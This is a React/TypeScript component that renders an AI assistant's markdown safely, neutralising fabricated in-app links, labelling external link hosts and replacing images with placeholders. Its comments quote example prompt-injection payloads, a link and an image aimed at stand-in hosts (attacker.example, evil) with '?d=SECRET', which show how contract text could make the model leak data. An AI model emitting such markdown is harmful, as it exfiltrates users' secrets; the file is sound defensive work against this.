"use client";

import ReactMarkdown from "react-markdown";
import remarkGfm from "remark-gfm";
import { memo } from "react";

// The assistant sometimes fabricates a link to an in-app record (e.g.
// /intake/requests/REQ-4196) — a route that doesn't exist, so clicking it opens
// a blank page. Real navigation to a record comes from the app's own controls,
// never from model markdown. So we only trust links to a *different* host
// (genuine external URLs a tool returned — signing/share links); a relative
// link or one pointing at our own origin is rendered as plain, non-clickable
// text. Belt-and-suspenders with the prompt rule that tells it not to.
// Returns the destination host for an external link, else null. The host is
// also shown next to the link text: a prompt-injected
// [see clause](https://attacker.example/?d=SECRET) then reads
// "see clause (attacker.example)", so a person sees where a click goes before
// making it — the AI writes the link, the person decides to follow it.
function externalHost(href: string | undefined): string | null {
  if (!href) return null;
  try {
    const url = new URL(href, window.location.origin);
    if (url.protocol !== "http:" && url.protocol !== "https:") return null;
    return url.host !== window.location.host ? url.host : null;
  } catch {
    return null;
  }
}

/** Claude-style prose renderer for assistant messages. */
function MarkdownImpl({ children }: { children: string }) {
  return (
    <div className="font-sans text-[16px] leading-[1.75] text-slate-800">
      <ReactMarkdown
        // Never add rehype-raw: without it react-markdown renders raw HTML
        // (iframe, video, object, img...) as text, so the only URL-bearing
        // elements markdown can make are `a` and `img`, both handled below.
        remarkPlugins={[remarkGfm]}
        components={{
          h1: (p) => (
            <h1
              className="mb-3 mt-6 text-lg font-semibold text-slate-900 first:mt-0"
              {...p}
            />
          ),
          h2: (p) => (
            <h2
              className="mb-2 mt-6 text-base font-semibold text-slate-900 first:mt-0"
              {...p}
            />
          ),
          h3: (p) => (
            <h3
              className="mb-2 mt-5 text-sm font-semibold text-slate-900 first:mt-0"
              {...p}
            />
          ),
          p: (p) => <p className="my-3 first:mt-0 last:mb-0" {...p} />,
          ul: (p) => (
            <ul
              className="my-3 list-disc space-y-1.5 pl-5 marker:text-slate-400"
              {...p}
            />
          ),
          ol: (p) => (
            <ol
              className="my-3 list-decimal space-y-1.5 pl-5 marker:text-slate-400"
              {...p}
            />
          ),
          li: (p) => <li className="pl-1 leading-7" {...p} />,
          strong: (p) => (
            <strong className="font-semibold text-slate-900" {...p} />
          ),
          em: (p) => <em className="italic" {...p} />,
          a: ({ href, children, ...rest }) => {
            const host = externalHost(href);
            if (!host)
              // Fabricated in-app link → keep the text, drop the dead link.
              return <span className="font-medium text-slate-900">{children}</span>;
            return (
              <>
                <a
                  // rest first, so a spread prop can never override target/rel.
                  {...rest}
                  href={href}
                  className="font-medium text-brand-600 underline underline-offset-2 hover:text-brand-700"
                  target="_blank"
                  // noopener prevents older browsers/embedded webviews from
                  // exposing window.opener to the destination page; noreferrer
                  // also strips the Referer header. Belt-and-suspenders.
                  rel="noopener noreferrer"
                >
                  {children}
                </a>{" "}
                <span className="text-xs text-slate-500">({host})</span>
              </>
            );
          },
          // An image in model output is fetched the moment it renders (React
          // even adds a preload), so its URL can carry data out with no click:
          // contract text can prompt-inject ![x](https://evil/?d=SECRET).
          // Nothing the assistant writes needs an image; show a placeholder (with
          // the alt text when there is one) so nothing silently disappears.
          img: ({ alt }) => (
            <span className="italic text-slate-500">{alt ? `[image: ${alt}]` : "[image]"}</span>
          ),
          blockquote: (p) => (
            <blockquote
              className="my-3 border-l-2 border-slate-300 pl-4 italic text-slate-600"
              {...p}
            />
          ),
          hr: () => <hr className="my-5 border-slate-200" />,
          code: ({
            className,
            children,
            ...rest
          }: React.HTMLAttributes<HTMLElement>) => {
            const block = /language-/.test(className ?? "");
            if (block)
              return (
                <code
                  className="block overflow-x-auto rounded-lg bg-slate-900 p-4 text-[13px] leading-6 text-slate-100"
                  {...rest}
                >
                  {children}
                </code>
              );
            return (
              <code
                className="rounded bg-slate-100 px-1.5 py-0.5 font-mono text-[13px] text-slate-800"
                {...rest}
              >
                {children}
              </code>
            );
          },
          pre: (p) => <pre className="my-3" {...p} />,
          table: (p) => (
            <div className="my-3 overflow-x-auto">
              <table
                className="w-full border-collapse text-sm"
                {...p}
              />
            </div>
          ),
          th: (p) => (
            <th
              className="border border-slate-200 bg-slate-50 px-3 py-1.5 text-left font-semibold"
              {...p}
            />
          ),
          td: (p) => (
            <td className="border border-slate-200 px-3 py-1.5" {...p} />
          ),
        }}
      >
        {children}
      </ReactMarkdown>
    </div>
  );
}

export const Markdown = memo(MarkdownImpl);
